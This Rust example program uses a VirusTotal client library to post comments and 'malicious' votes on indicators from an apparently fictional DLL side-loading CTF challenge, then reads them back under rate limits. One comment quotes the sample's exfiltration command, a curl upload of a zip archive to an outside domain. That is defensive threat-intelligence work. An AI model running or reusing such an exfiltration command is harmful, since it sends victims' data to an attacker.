use std::env;
use tokio::time::{sleep, Duration, Instant};
use virustotal_rs::{ApiTier, ClientBuilder, VoteVerdict};

/// Helper to enforce public API rate limit (4 requests per minute)
struct RateLimiter {
    last_request: Instant,
    request_count: u32,
    minute_start: Instant,
}

impl RateLimiter {
    fn new() -> Self {
        Self {
            last_request: Instant::now(),
            request_count: 0,
            minute_start: Instant::now(),
        }
    }

    async fn wait_if_needed(&mut self) {
        // Reset counter if a minute has passed
        if self.minute_start.elapsed() >= Duration::from_secs(60) {
            self.request_count = 0;
            self.minute_start = Instant::now();
            println!("  ⏱️  Rate limit counter reset (new minute)");
        }

        // If we've made 4 requests this minute, wait until the minute is up
        if self.request_count >= 4 {
            let wait_time = Duration::from_secs(60) - self.minute_start.elapsed();
            if wait_time > Duration::ZERO {
                println!(
                    "  ⏳ Rate limit reached (4/min). Waiting {} seconds...",
                    wait_time.as_secs()
                );
                sleep(wait_time).await;
                self.request_count = 0;
                self.minute_start = Instant::now();
            }
        }

        // Ensure at least 15 seconds between requests (4 per minute = 1 per 15 seconds)
        let time_since_last = self.last_request.elapsed();
        if time_since_last < Duration::from_secs(15) {
            let wait_time = Duration::from_secs(15) - time_since_last;
            println!(
                "  ⏱️  Waiting {} seconds to respect rate limit...",
                wait_time.as_secs()
            );
            sleep(wait_time).await;
        }

        self.last_request = Instant::now();
        self.request_count += 1;
        println!("  📊 Request {}/4 this minute", self.request_count);
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Get API key from environment variable
    let api_key = env::var("VTI_API_KEY").expect("VTI_API_KEY environment variable not set");

    println!("Using API key from VTI_API_KEY environment variable");

    // Create client with public tier
    let client = ClientBuilder::new()
        .api_key(api_key)
        .tier(ApiTier::Public)
        .build()?;

    // Resources from the CTF
    let dll_hash = "02032ea322036e66f2825a0342979ad942ad5e201a674dc1c0085617467d661c"; // 7z.dll
    let domain = "office.msftupdated.com";
    let ip = "35.208.137.212";

    // Create rate limiter
    let mut rate_limiter = RateLimiter::new();

    println!("\n{}", "=".repeat(60));
    println!("🎯 CTF CONTEXT: APT 111 - DFIR Challenge");
    println!("{}", "=".repeat(60));
    println!("\nThis is a simulated threat for a DFIR CTF challenge:");
    println!("• Threat Group: APT 111 (fictional)");
    println!("• Malware: 7z.dll (DLL side-loading)");
    println!("• C2 Domain: office.msftupdated.com");
    println!("• C2 IP: 35.208.137.212");
    println!("\n⚠️  Using PUBLIC API tier rate limiting:");
    println!("• Max 4 requests per minute");
    println!("• Automatic pacing enabled (15 seconds between requests)");

    println!("\n{}", "=".repeat(60));
    println!("💬 PHASE 1: ADDING COMMENTS");
    println!("{}", "=".repeat(60));

    // Add comment to the DLL file
    println!("\n📝 [1/3] Adding comment to 7z.dll...");
    rate_limiter.wait_if_needed().await;
    match client.files().add_comment(
        dll_hash,
        "APT 111 malware sample from DFIR CTF. DLL side-loading technique using legitimate 7z.dll name. \
         Collects system info (ipconfig, netstat, tasklist, net commands) via system() calls. \
         Archives data with zip.exe and exfiltrates to https://office.msftupdated.com using curl. \
         Strings show: 'curl.exe -F file=@1.zip https://office.msftupdater.com' \
         #CTF #APT111 #DLLSideLoading #DFIR"
    ).await {
        Ok(comment) => {
            println!("  ✅ Comment added successfully!");
            println!("  Comment ID: {}", comment.object.id);
        },
        Err(e) => {
            println!("  ⚠️  Could not add comment: {}", e);
        }
    }

    // Add comment to the domain
    println!("\n📝 [2/3] Adding comment to domain...");
    rate_limiter.wait_if_needed().await;
    match client.domains().add_comment(
        domain,
        "APT 111 C2 domain from DFIR CTF. Receives exfiltrated system info from DLL side-loading malware. \
         The malware uses curl to POST zip archives here. Hosted on Google Cloud IP 35.208.137.212. \
         Part of a simulated threat scenario for CTF training. #CTF #APT111 #C2 #DFIR"
    ).await {
        Ok(comment) => {
            println!("  ✅ Comment added successfully!");
            println!("  Comment ID: {}", comment.object.id);
        },
        Err(e) => {
            println!("  ⚠️  Could not add comment: {}", e);
        }
    }

    // Add comment to the IP
    println!("\n📝 [3/3] Adding comment to IP address...");
    rate_limiter.wait_if_needed().await;
    match client.ip_addresses().add_comment(
        ip,
        "APT 111 C2 server from DFIR CTF. Google Cloud IP hosting the malicious domain office.msftupdated.com. \
         Receives exfiltrated data from DLL side-loading attack via HTTPS POST. \
         This is a CTF training scenario - not a real threat. #CTF #APT111 #DFIR"
    ).await {
        Ok(comment) => {
            println!("  ✅ Comment added successfully!");
            println!("  Comment ID: {}", comment.object.id);
        },
        Err(e) => {
            println!("  ⚠️  Could not add comment: {}", e);
        }
    }

    println!("\n{}", "=".repeat(60));
    println!("🗳️ PHASE 2: ADDING VOTES");
    println!("{}", "=".repeat(60));

    // Add vote to the DLL file
    println!("\n🗳️ [1/3] Voting on 7z.dll as malicious...");
    rate_limiter.wait_if_needed().await;
    match client
        .files()
        .add_vote(dll_hash, VoteVerdict::Malicious)
        .await
    {
        Ok(vote) => {
            println!("  ✅ Vote added successfully!");
            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
        }
        Err(e) => {
            println!("  ⚠️  Could not add vote: {}", e);
        }
    }

    // Add vote to the domain
    println!("\n🗳️ [2/3] Voting on domain as malicious...");
    rate_limiter.wait_if_needed().await;
    match client
        .domains()
        .add_vote(domain, VoteVerdict::Malicious)
        .await
    {
        Ok(vote) => {
            println!("  ✅ Vote added successfully!");
            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
        }
        Err(e) => {
            println!("  ⚠️  Could not add vote: {}", e);
        }
    }

    // Add vote to the IP
    println!("\n🗳️ [3/3] Voting on IP as malicious...");
    rate_limiter.wait_if_needed().await;
    match client
        .ip_addresses()
        .add_vote(ip, VoteVerdict::Malicious)
        .await
    {
        Ok(vote) => {
            println!("  ✅ Vote added successfully!");
            println!("  Vote verdict: {:?}", vote.object.attributes.verdict);
        }
        Err(e) => {
            println!("  ⚠️  Could not add vote: {}", e);
        }
    }

    println!("\n{}", "=".repeat(60));
    println!("📊 PHASE 3: VERIFYING COMMENTS & VOTES");
    println!("{}", "=".repeat(60));

    // Check file comments and votes
    println!("\n🔍 [1/6] Checking 7z.dll comments...");
    rate_limiter.wait_if_needed().await;
    match client.files().get_comments_with_limit(dll_hash, 5).await {
        Ok(comments) => {
            println!("  Found {} comment(s):", comments.data.len());
            for (i, comment) in comments.data.iter().enumerate().take(3) {
                let preview = if comment.object.attributes.text.len() > 100 {
                    format!("{}...", &comment.object.attributes.text[..100])
                } else {
                    comment.object.attributes.text.clone()
                };
                println!("    {}. {}", i + 1, preview);
            }
        }
        Err(e) => println!("  Error: {}", e),
    }

    println!("\n🔍 [2/6] Checking 7z.dll votes...");
    rate_limiter.wait_if_needed().await;
    match client.files().get_votes(dll_hash).await {
        Ok(votes) => {
            let malicious = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
                .count();
            let harmless = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
                .count();
            println!(
                "  Total votes: {} (Malicious: {}, Harmless: {})",
                votes.data.len(),
                malicious,
                harmless
            );
        }
        Err(e) => println!("  Error getting votes: {}", e),
    }

    // Check domain comments and votes
    println!("\n🔍 [3/6] Checking domain comments...");
    rate_limiter.wait_if_needed().await;
    match client.domains().get_comments_with_limit(domain, 5).await {
        Ok(comments) => {
            println!("  Found {} comment(s):", comments.data.len());
            for (i, comment) in comments.data.iter().enumerate().take(3) {
                let preview = if comment.object.attributes.text.len() > 100 {
                    format!("{}...", &comment.object.attributes.text[..100])
                } else {
                    comment.object.attributes.text.clone()
                };
                println!("    {}. {}", i + 1, preview);
            }
        }
        Err(e) => println!("  Error: {}", e),
    }

    println!("\n🔍 [4/6] Checking domain votes...");
    rate_limiter.wait_if_needed().await;
    match client.domains().get_votes(domain).await {
        Ok(votes) => {
            let malicious = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
                .count();
            let harmless = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
                .count();
            println!(
                "  Total votes: {} (Malicious: {}, Harmless: {})",
                votes.data.len(),
                malicious,
                harmless
            );
        }
        Err(e) => println!("  Error getting votes: {}", e),
    }

    // Check IP comments and votes
    println!("\n🔍 [5/6] Checking IP comments...");
    rate_limiter.wait_if_needed().await;
    match client.ip_addresses().get_comments_with_limit(ip, 5).await {
        Ok(comments) => {
            println!("  Found {} comment(s):", comments.data.len());
            for (i, comment) in comments.data.iter().enumerate().take(3) {
                let preview = if comment.object.attributes.text.len() > 100 {
                    format!("{}...", &comment.object.attributes.text[..100])
                } else {
                    comment.object.attributes.text.clone()
                };
                println!("    {}. {}", i + 1, preview);
            }
        }
        Err(e) => println!("  Error: {}", e),
    }

    println!("\n🔍 [6/6] Checking IP votes...");
    rate_limiter.wait_if_needed().await;
    match client.ip_addresses().get_votes(ip).await {
        Ok(votes) => {
            let malicious = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Malicious)
                .count();
            let harmless = votes
                .data
                .iter()
                .filter(|v| v.object.attributes.verdict == VoteVerdict::Harmless)
                .count();
            println!(
                "  Total votes: {} (Malicious: {}, Harmless: {})",
                votes.data.len(),
                malicious,
                harmless
            );
        }
        Err(e) => println!("  Error getting votes: {}", e),
    }

    println!("\n{}", "=".repeat(60));
    println!("✅ CTF THREAT INTELLIGENCE OPERATION COMPLETE!");
    println!("{}", "=".repeat(60));
    println!("\n📌 Summary:");
    println!("  • Successfully documented APT 111 CTF challenge");
    println!("  • Added detailed malware analysis comments");
    println!("  • Voted on malicious indicators");
    println!("  • All operations completed within rate limits");
    println!("\n📈 Rate Limiting Stats:");
    println!("  • Total API calls: 12");
    println!("  • Time elapsed: ~3 minutes");
    println!("  • Rate: 4 requests/minute (PUBLIC tier)");

    Ok(())
}
